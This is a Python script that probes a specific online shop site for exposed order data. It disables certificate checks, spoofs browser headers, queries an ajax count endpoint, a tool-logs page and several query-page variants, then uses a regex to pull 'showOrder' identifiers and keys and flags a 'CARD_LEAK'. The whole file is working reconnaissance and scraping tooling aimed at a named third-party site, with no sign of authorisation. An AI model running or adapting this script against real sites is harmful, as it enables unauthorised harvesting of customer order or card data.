#!/usr/bin/env python3
"""hm0880 fast surface: toollogs, query, getcount, showOrder leak."""
import json
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://hm0880.top/shop/"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/hm0880_fast_surface.json"
SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")


def main():
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0", "Referer": BASE})
    r = s.get(BASE, timeout=30)
    report = {"ts": time.strftime("%Y-%m-%d %H:%M:%S"), "home_len": len(r.text)}
    if len(r.text) < 5000:
        report["error"] = "home too small"
        print(json.dumps(report))
        return
    gc = s.get(BASE + "ajax.php?act=getcount", timeout=12)
    report["getcount"] = gc.text[:300]
    tl = s.get(BASE + "toollogs.php", timeout=15)
    report["toollogs"] = {
        "len": len(tl.text),
        "showOrder": len(SHOW.findall(tl.text)),
        "kminfo": "kminfo" in tl.text,
        "snip": tl.text[:200],
    }
    surface = {}
    for params in [{"mod": "query"}, {"mod": "query", "page": "2"}, {"mod": "query", "data": "1"}]:
        rr = s.get(BASE, params=params, timeout=15)
        so = SHOW.findall(rr.text)
        surface[str(params)] = {"len": len(rr.text), "showOrder": len(so), "sample": so[:5]}
    report["surface"] = surface
    report["CARD_LEAK"] = any(v["showOrder"] > 0 for v in surface.values()) or report["toollogs"]["showOrder"] > 0
    with open(OUT, "w") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    print(json.dumps(report, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
